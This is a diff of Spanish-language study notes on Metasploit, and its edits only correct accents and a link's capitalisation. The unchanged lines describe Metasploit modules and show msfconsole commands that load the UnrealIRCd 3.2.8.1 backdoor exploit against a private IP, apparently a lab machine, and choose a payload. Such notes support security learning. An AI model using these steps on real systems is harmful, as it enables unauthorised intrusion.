@@ -6,7 +6,7 @@
 - Entonces metasploit almacena un modulo y nos permite utilizarlo.
 - Ademas, tiene herramientas auxiliares que nos permiten realizar toda la fase de lanzamiento del exploit contra un target, Manejo de la conexión que nos puede devolver ese target hacia nosotros.
 
-La instalacion en Windows se puede realizar pero seria muy dificil porque Windows defender se activaria para bloquearlo. 
+La instalación en Windows se puede realizar pero seria muy difícil porque Windows defender se activaría para bloquearlo. 
 
 
 
@@ -21,7 +21,7 @@ msf6 > use 0
 msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set rhosts 192.168.180.131
 msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show options
 
-*Ademas del exploit necesitamos un [[payload]]*
+*Ademas del exploit necesitamos un [[Payload]]*
 
 msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show payloads
 msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload 7
